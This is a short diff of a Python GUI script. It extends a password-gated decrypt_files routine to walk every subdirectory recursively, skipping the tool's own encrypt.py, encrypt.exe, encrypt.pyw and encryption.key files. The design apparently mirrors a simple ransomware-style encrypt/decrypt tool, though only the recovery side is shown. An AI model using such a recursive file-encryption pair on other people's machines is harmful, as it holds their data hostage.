@@ -82,13 +82,14 @@ def decrypt_files():
         key = load_encryption_key()
         files = []
 
-        for file in os.listdir():
-            if file == "encrypt.py" or file == "encryption.key" or file == "encrypt.exe" or file == "encrypt.pyw":
-                continue
-            if os.path.isfile(file):
-                _, file_extension = os.path.splitext(file)
+        # Recorre el directorio actual y sus subdirectorios
+        for root, directories, filenames in os.walk('.'):
+            for filename in filenames:
+                if filename == "encrypt.py" or filename == "encryption.key" or filename == "encrypt.exe" or filename == "encrypt.pyw":
+                    continue
+                _, file_extension = os.path.splitext(filename)
                 if file_extension.lower() in ALLOWED_EXTENSIONS:
-                    files.append(file)
+                    files.append(os.path.join(root, filename))
 
         # Mostrar un indicador de procesamiento
         result_label.config(text="Decrypting files...", fg="blue")
@@ -108,6 +109,7 @@ def decrypt_files():
                 result_label.config(text="No files to decrypt", fg="black")
     else:
         result_label.config(text="Incorrect password", fg="red", bg=bg_color)
+
 
 
 
